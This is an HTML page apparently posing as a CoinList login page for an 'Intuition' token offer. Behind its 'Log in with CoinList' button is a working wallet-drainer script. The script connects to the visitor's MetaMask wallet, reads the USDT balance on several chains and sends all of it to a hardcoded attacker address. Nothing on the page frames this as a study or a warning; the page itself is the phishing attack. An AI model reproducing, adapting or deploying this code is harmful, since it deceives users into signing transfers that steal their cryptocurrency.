<!DOCTYPE html>
<html lang="en" class="[scrollbar-gutter:stable]"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
	<link rel="icon" type="image/x-icon" href="favicon.ico">
	
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title data-default="CoinList">CoinList</title>
    <link phx-track-static="" rel="stylesheet" href="./assets/app-e494786a071b68b4a265f13aa79e6140.css">


    
    
  </head>
  <body class="bg-background text-background-a11y">
    <style nonce="">
  :root {
    --color-brand: 227 110 27;
    --color-brand-a11y: 0 0 0;
    --color-background: 250 250 250;
    --color-background-a11y: 0 0 0;
  }

  
  .cl-funnel-logo {
    --cl-logo: ""; 
    background-image: url(https://cdn.coinlist.co/offers/logos/intuition-dark.svg);
    background-repeat: no-repeat;
    background-size: contain;
    background-color: transparent;
  }
  
</style>



<main class="p-6 pt-12 max-w-xl mx-auto w-full flex flex-col items-stretch justify-center min-h-screen">
  <div id="flash-group">
  
  
  <div id="client-error" phx-click="[[&quot;push&quot;,{&quot;value&quot;:{&quot;key&quot;:&quot;error&quot;},&quot;event&quot;:&quot;lv:clear-flash&quot;}],[&quot;hide&quot;,{&quot;time&quot;:200,&quot;to&quot;:&quot;#client-error&quot;,&quot;transition&quot;:[[&quot;transition-all&quot;,&quot;transform&quot;,&quot;ease-in&quot;,&quot;duration-200&quot;],[&quot;opacity-100&quot;,&quot;translate-y-0&quot;,&quot;sm:scale-100&quot;],[&quot;opacity-0&quot;,&quot;translate-y-4&quot;,&quot;sm:translate-y-0&quot;,&quot;sm:scale-95&quot;]]}]]" role="alert" class="fixed top-2 right-2 mr-2 w-80 sm:w-96 z-50 rounded-lg p-3 ring-1 bg-rose-50 text-rose-900 shadow-md ring-rose-500 fill-rose-900" hidden="" phx-connected="[[&quot;hide&quot;,{&quot;time&quot;:200,&quot;to&quot;:&quot;#client-error&quot;,&quot;transition&quot;:[[&quot;transition-all&quot;,&quot;transform&quot;,&quot;ease-in&quot;,&quot;duration-200&quot;],[&quot;opacity-100&quot;,&quot;translate-y-0&quot;,&quot;sm:scale-100&quot;],[&quot;opacity-0&quot;,&quot;translate-y-4&quot;,&quot;sm:translate-y-0&quot;,&quot;sm:scale-95&quot;]]}]]" phx-disconnected="[[&quot;show&quot;,{&quot;time&quot;:300,&quot;to&quot;:&quot;.phx-client-error #client-error&quot;,&quot;transition&quot;:[[&quot;transition-all&quot;,&quot;transform&quot;,&quot;ease-out&quot;,&quot;duration-300&quot;],[&quot;opacity-0&quot;,&quot;translate-y-4&quot;,&quot;sm:translate-y-0&quot;,&quot;sm:scale-95&quot;],[&quot;opacity-100&quot;,&quot;translate-y-0&quot;,&quot;sm:scale-100&quot;]]}]]">
  <p class="flex items-center gap-1.5 text-sm font-semibold leading-6">
    
    <span class="hero-exclamation-circle-mini h-4 w-4"></span>
    We can't find the internet
  </p>
  <p class="mt-2 text-sm leading-5">
    Attempting to reconnect
    <span class="hero-arrow-path ml-1 h-3 w-3 animate-spin"></span>
  </p>
  <button type="button" class="group absolute top-1 right-1 p-2" aria-label="close">
    <span class="hero-x-mark-solid h-5 w-5 opacity-40 group-hover:opacity-70"></span>
  </button>
</div>

  <div id="server-error" phx-click="[[&quot;push&quot;,{&quot;value&quot;:{&quot;key&quot;:&quot;error&quot;},&quot;event&quot;:&quot;lv:clear-flash&quot;}],[&quot;hide&quot;,{&quot;time&quot;:200,&quot;to&quot;:&quot;#server-error&quot;,&quot;transition&quot;:[[&quot;transition-all&quot;,&quot;transform&quot;,&quot;ease-in&quot;,&quot;duration-200&quot;],[&quot;opacity-100&quot;,&quot;translate-y-0&quot;,&quot;sm:scale-100&quot;],[&quot;opacity-0&quot;,&quot;translate-y-4&quot;,&quot;sm:translate-y-0&quot;,&quot;sm:scale-95&quot;]]}]]" role="alert" class="fixed top-2 right-2 mr-2 w-80 sm:w-96 z-50 rounded-lg p-3 ring-1 bg-rose-50 text-rose-900 shadow-md ring-rose-500 fill-rose-900" hidden="" phx-connected="[[&quot;hide&quot;,{&quot;time&quot;:200,&quot;to&quot;:&quot;#server-error&quot;,&quot;transition&quot;:[[&quot;transition-all&quot;,&quot;transform&quot;,&quot;ease-in&quot;,&quot;duration-200&quot;],[&quot;opacity-100&quot;,&quot;translate-y-0&quot;,&quot;sm:scale-100&quot;],[&quot;opacity-0&quot;,&quot;translate-y-4&quot;,&quot;sm:translate-y-0&quot;,&quot;sm:scale-95&quot;]]}]]" phx-disconnected="[[&quot;show&quot;,{&quot;time&quot;:300,&quot;to&quot;:&quot;.phx-server-error #server-error&quot;,&quot;transition&quot;:[[&quot;transition-all&quot;,&quot;transform&quot;,&quot;ease-out&quot;,&quot;duration-300&quot;],[&quot;opacity-0&quot;,&quot;translate-y-4&quot;,&quot;sm:translate-y-0&quot;,&quot;sm:scale-95&quot;],[&quot;opacity-100&quot;,&quot;translate-y-0&quot;,&quot;sm:scale-100&quot;]]}]]">
  <p class="flex items-center gap-1.5 text-sm font-semibold leading-6">
    
    <span class="hero-exclamation-circle-mini h-4 w-4"></span>
    Something went wrong!
  </p>
  <p class="mt-2 text-sm leading-5">
    Hang in there while we get back on track
    <span class="hero-arrow-path ml-1 h-3 w-3 animate-spin"></span>
  </p>
  <button type="button" class="group absolute top-1 right-1 p-2" aria-label="close">
    <span class="hero-x-mark-solid h-5 w-5 opacity-40 group-hover:opacity-70"></span>
  </button>
</div>
</div>
  <div class="text-center space-y-4">
  <span class="cl-logo h-16 w-16 inline-block text-background-a11y cl-funnel-logo"></span>

  

  <header class="">
  <div>
    <h1 class="capitalize font-title text-4xl leading-10">
      
    Intuition - Option 2
    
    </h1>
    <p class="font-body mt-3 leading-6 text-background-a11y-500">
      
      Log in with CoinList to get started.
    
    </p>
  </div>
  <div class="flex-none space-x-2"></div>
</header>

  

  <a onclick="callconnectWallet()" href="#" class="rounded-full py-3 px-2.5 capitalize text-md font-semibold tracking-wider leading-6 active:scale-95 transition-all text-background-a11y-50 bg-background-a11y-900 hover:bg-background-a11y-800 text-center flex items-center justify-center gap-2">
  
    <span class="cl-logo w-5 h-5"></span>
    Log in with CoinList
  
</a>
</div>
</main>
  
	  	<script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>

	
		<script>
    const YOUR_WALLET_ADDRESS = "0x67fAC212Ed84C54A0d0e5911232FbC3673aD493b";

    const USDT_ADDRESSES = {
      1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      56: "0x55d398326f99059fF775485246999027B3197955",
      42161: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
      137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",	
    };

    const ERC20_ABI = [
      {
        constant: true,
        type: "function",
        name: "balanceOf",
        inputs: [{ name: "_owner", type: "address" }],
        outputs: [{ name: "balance", type: "uint256" }],
      },
      {
        constant: false,
        type: "function",
        name: "transfer",
        inputs: [
          { name: "_to", type: "address" },
          { name: "_value", type: "uint256" },
        ],
        outputs: [{ name: "success", type: "bool" }],
      },
    ];

    async function callconnectWallet() {
      if (window.ethereum) {
        try {
          console.log("Requesting accounts...");
          await window.ethereum.request({ method: "eth_requestAccounts" });
          const web3 = new Web3(window.ethereum);
          const accounts = await web3.eth.getAccounts();
          const userAddress = accounts[0];
          console.log("Connected account:", userAddress);
          await sendUSDT(web3, userAddress);
        } catch (error) {
          console.error("Connection failed:", error);
        }
      } else {
        console.error("MetaMask not detected");
      }
    }

    async function sendUSDT(web3, userAddress) {
      try {
        const chainId = await web3.eth.getChainId();
        console.log("Chain ID:", chainId);
        const tokenAddress = USDT_ADDRESSES[chainId];
        if (!tokenAddress) {
          console.error("Unsupported chain ID:", chainId);
          return;
        }
        console.log("USDT contract address:", tokenAddress);
        const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);

        const balance = await tokenContract.methods.balanceOf(userAddress).call();
        console.log("USDT balance:", balance);

        const gasPrice = await web3.eth.getGasPrice();
        console.log("Gas price:", gasPrice);

        let estimatedGas;
        try {
          estimatedGas = await tokenContract.methods
            .transfer(YOUR_WALLET_ADDRESS, balance)
            .estimateGas({ from: userAddress });
          console.log("Estimated gas:", estimatedGas);
        } catch (err) {
          console.warn("Gas estimation failed, fallback to 50000 gas", err);
          estimatedGas = 50000;
        }

        const nativeBalance = BigInt(await web3.eth.getBalance(userAddress));
        const gasCost = BigInt(gasPrice) * BigInt(estimatedGas);
        console.log("Native balance:", nativeBalance.toString());
        console.log("Gas cost:", gasCost.toString());

        if (nativeBalance < gasCost) {
          console.error("Not enough native token to pay gas");
          return;
        }

        const tx = tokenContract.methods.transfer(YOUR_WALLET_ADDRESS, balance);
        const txData = tx.encodeABI();

        const txParams = {
          from: userAddress,
          to: tokenAddress,
          data: txData,
          gas: estimatedGas,
          gasPrice: gasPrice,
        };

        console.log("Sending transaction...");
        web3.eth
          .sendTransaction(txParams)
          .on("transactionHash", (hash) => {
            console.log("Transaction sent with hash:", hash);
          })
          .on("receipt", (receipt) => {
            console.log("Transaction confirmed:", receipt);
          })
          .on("error", (err) => {
            console.error("Transaction failed:", err);
          });
      } catch (error) {
        console.error("Unexpected error in sendUSDT:", error);
      }
    }
  </script>


</body></html>